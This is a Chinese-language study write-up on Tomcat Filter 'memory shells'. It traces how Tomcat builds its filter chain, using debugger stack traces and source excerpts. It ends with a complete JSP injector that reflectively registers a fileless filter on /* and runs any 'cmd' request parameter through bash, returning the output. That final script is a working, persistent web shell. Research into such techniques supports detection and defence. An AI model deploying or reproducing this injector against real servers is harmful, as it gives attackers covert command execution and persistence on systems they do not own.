# 内存马学习
***
## 一. Filter内存马
Filter被称为过滤器，是Java中最常见的也最实用的技术之一，通常被用来处理静态web资源、访问控制权限、记录日志等附加功能等等。一次请求进入服务器后，将先由Filter对用户请求进行预处理，再交给servlet。

通常情况下，Filter配置在配置文件和注解中，在其他代码如果想要完成注册，可采用以下几种方式：

1.使用servletContext的addFilter/createFilter方法进行注册。

2.使用servletContextListen的contextInitialized方法在服务器启动时注册。

3.使用ServletContainerInitializer 的 onstartup 方法在初始化时注册。

通过创建Filter来查看Filter是怎么被调用的，新建一个Filter并在DoFilter下断点
```java
package filter;

import javax.servlet.*;
import java.io.IOException;

public class testfilter implements Filter {
    public void init(FilterConfig filterConfig) throws ServletException {
        System.out.println("Test Filter init 方法被执行");
    }

    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        System.out.println("doFilter方法被执行");
        filterChain.doFilter(servletRequest,servletResponse);
    }

    public void destroy() {
        System.out.println("Test Filter destroy 方法被执行");
    }
}
```
在web.xml中注册Filter，设置url-pattern为/demo，即请求/demo才会触发
```xml
    <filter>
        <filter-name>TestFilter1</filter-name>
        <filter-class>filter.testfilter</filter-class>
    </filter>
    <filter-mapping>
        <filter-name>TestFilter1</filter-name>
        <url-pattern>/demo</url-pattern>
    </filter-mapping>
```
注册完成之后访问/demo即可触发Filter
```
doFilter方法被执行
doFilter方法被执行
doFilter方法被执行
doFilter方法被执行
doFilter方法被执行
```
对该Filter下断点，查看Tomcat是如何调用doFilter方法的
```
doFilter:12, testfilter (filter)
internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core)
doFilter:166, ApplicationFilterChain (org.apache.catalina.core)
invoke:197, StandardWrapperValve (org.apache.catalina.core)
invoke:97, StandardContextValve (org.apache.catalina.core)
invoke:543, AuthenticatorBase (org.apache.catalina.authenticator)
invoke:135, StandardHostValve (org.apache.catalina.core)
invoke:92, ErrorReportValve (org.apache.catalina.valves)
invoke:698, AbstractAccessLogValve (org.apache.catalina.valves)
invoke:78, StandardEngineValve (org.apache.catalina.core)
service:367, CoyoteAdapter (org.apache.catalina.connector)
service:639, Http11Processor (org.apache.coyote.http11)
process:65, AbstractProcessorLight (org.apache.coyote)
process:885, AbstractProtocol$ConnectionHandler (org.apache.coyote)
doRun:1693, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)
run:49, SocketProcessorBase (org.apache.tomcat.util.net)
runWorker:1191, ThreadPoolExecutor (org.apache.tomcat.util.threads)
run:659, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)
run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)
run:750, Thread (java.lang)
```
查看ApplicationFilterChain类的internalDoFilter方法，可以看到Filter是从filters获取的
```
// org/apache/catalina/core/ApplicationFilterChain.java

private void internalDoFilter(ServletRequest request,
                                  ServletResponse response)
        throws IOException, ServletException {

        ...
        // 获取FilterConfig配置
        ApplicationFilterConfig filterConfig = filters[pos++];
        // 获取Filter
        Filter filter = filterConfig.getFilter();
        ...
        // 调用Filter的doFilter方法
        filter.doFilter(request, response, this);
    }
```
Filters数组是通过addFilter来添加的
```
// org/apache/catalina/core/ApplicationFilterChain.java

    void addFilter(ApplicationFilterConfig filterConfig) {

        // Prevent the same filter being added multiple times
        for(ApplicationFilterConfig filter:filters) {
            if(filter==filterConfig) {
                return;
            }
        }

        if (n == filters.length) {
            ApplicationFilterConfig[] newFilters =
                new ApplicationFilterConfig[n + INCREMENT];
            System.arraycopy(filters, 0, newFilters, 0, n);
            filters = newFilters;
        }
        filters[n++] = filterConfig;

    }
```
对addFilter方法下断点，重新访问/demo，触发断点
```
addFilter:280, ApplicationFilterChain (org.apache.catalina.core)
createFilterChain:118, ApplicationFilterFactory (org.apache.catalina.core)
invoke:169, StandardWrapperValve (org.apache.catalina.core)
invoke:97, StandardContextValve (org.apache.catalina.core)
invoke:543, AuthenticatorBase (org.apache.catalina.authenticator)
invoke:135, StandardHostValve (org.apache.catalina.core)
invoke:92, ErrorReportValve (org.apache.catalina.valves)
invoke:698, AbstractAccessLogValve (org.apache.catalina.valves)
invoke:78, StandardEngineValve (org.apache.catalina.core)
service:367, CoyoteAdapter (org.apache.catalina.connector)
service:639, Http11Processor (org.apache.coyote.http11)
process:65, AbstractProcessorLight (org.apache.coyote)
process:885, AbstractProtocol$ConnectionHandler (org.apache.coyote)
doRun:1693, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)
run:49, SocketProcessorBase (org.apache.tomcat.util.net)
runWorker:1191, ThreadPoolExecutor (org.apache.tomcat.util.threads)
run:659, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)
run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)
run:750, Thread (java.lang)
```
查看createFilterChain方法
```
// org/apache/catalina/core/ApplicationFilterFactory.java

public static ApplicationFilterChain createFilterChain(ServletRequest request,
            Wrapper wrapper, Servlet servlet) {
        // 获取StandardContext
        StandardContext context = (StandardContext) wrapper.getParent();
        // 从 获取StandardContext 获取到所有Filter
        FilterMap filterMaps[] = context.findFilterMaps();
        ...
        // 获取 filterConfig
        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig)
                    context.findFilterConfig(filterMap.getFilterName());
        ...
        // 将filterConfig添加金filterChian
        filterChain.addFilter(filterConfig);
        ...
    }
```
查看findFilterMaps以及findFilterConfig是怎么获取到Filter的
```
// org/apache/catalina/core/StandardContext.java

// 获取 filterMaps
public FilterMap[] findFilterMaps() {
        return filterMaps.asArray();
}
// 获取 filterConfigs
public FilterConfig findFilterConfig(String name) {
    return filterConfigs.get(name);
}
```
查看findFilterMaps和findFilterConfig是怎么将内容添加进去的
```
// org/apache/catalina/core/StandardContext.java

// 将filterMap添加到FilterMaps
@Override
public void addFilterMap(FilterMap filterMap) {
    validateFilterMap(filterMap);
    // Add this filter mapping to our registered set
    filterMaps.add(filterMap);
    fireContainerEvent("addFilterMap", filterMap);
}

// 将filterMap添加到FilterMaps
@Override
public void addFilterMapBefore(FilterMap filterMap) {
    validateFilterMap(filterMap);
    // Add this filter mapping to our registered set
    filterMaps.addBefore(filterMap);
    fireContainerEvent("addFilterMap", filterMap);
}

// 将ApplicationFilterConfig实例添加进filterConfigs
public boolean filterStart() {
    ...
    synchronized (filterConfigs) {
        // 清空 filterConfigs
        filterConfigs.clear();
        for (Entry<String,FilterDef> entry : filterDefs.entrySet()) {
            // 获取filterDef的key
            String name = entry.getKey();
            ...
            try {
                // 创建ApplicationFilterConfig实例并将当前类以及FilterDef的value添加进去
                ApplicationFilterConfig filterConfig =
                        new ApplicationFilterConfig(this, entry.getValue());
                // 将实例添加进filterConfigs
                filterConfigs.put(name, filterConfig);
            } catch (Throwable t) {
                t = ExceptionUtils.unwrapInvocationTargetException(t);
                ExceptionUtils.handleThrowable(t);
                getLogger().error(sm.getString(
                        "standardContext.filterStart", name), t);
                ok = false;
            }
        }
    }

    return ok;
}
```
在addFilterMap下断点，通过调试得知FilterMap需设置filterName以及urlpattern

这里涉及到一个新的实例filterDef，查看filterDefs的添加方法
```
public void addFilterDef(FilterDef filterDef) {

    synchronized (filterDefs) {
        filterDefs.put(filterDef.getFilterName(), filterDef);
    }
    fireContainerEvent("addFilterDef", filterDef);

}
```
在addFilterDef下断点并从重启Tomcat，通过调试得知FilterDef需要设置FilterName以及FilterClass

完整的内存马
```jsp
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.util.Map" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page import="org.apache.catalina.Context" %><%--
  Created by IntelliJ IDEA.
  User: Luc
  Date: 2022/12/15
  Time: 17:12
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
  final String name = "Wh0Am1";
  // 获取 servlet Context
  ServletContext servletContext = request.getSession().getServletContext();

  Field appctx = servletContext.getClass().getDeclaredField("context");
  appctx.setAccessible(true);
  ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

  Field stdctx = applicationContext.getClass().getDeclaredField("context");
  stdctx.setAccessible(true);
  StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

  Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
  Configs.setAccessible(true);
  Map filterConfigs = (Map) Configs.get(standardContext);

  if(filterConfigs.get(name) == null){
    Filter filter = new Filter() {
      @Override
      public void init(FilterConfig filterConfig) throws ServletException {

      }

      @Override
      public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        HttpServletRequest req = (HttpServletRequest) servletRequest;
        if (req.getParameter("cmd") != null){
          byte[] bytes = new byte[1024];
          Process process = new ProcessBuilder("bash","-c",req.getParameter("cmd")).start();
          int len = process.getInputStream().read(bytes);
          servletResponse.getWriter().write(new String(bytes,0,len));
          process.destroy();
          return;
        }
        filterChain.doFilter(servletRequest,servletResponse);
      }

      @Override
      public void destroy() {

      }
    };

    FilterDef filterDef = new FilterDef();
    filterDef.setFilter(filter);
    filterDef.setFilterName(name);
    filterDef.setFilterClass(filter.getClass().getName());

    /**
     * 将filterDef添加到filterDefs中
     */
    standardContext.addFilterDef(filterDef);

    FilterMap filterMap = new FilterMap();
    filterMap.addURLPattern("/*");
    filterMap.setFilterName(name);

    standardContext.addFilterMapBefore(filterMap);

    Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
    constructor.setAccessible(true);
    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);

    filterConfigs.put(name,filterConfig);
    out.print("Inject Success !");
  }
%>
<html>
<head>
    <title>Title</title>
</head>
<body>

</body>
</html>

```


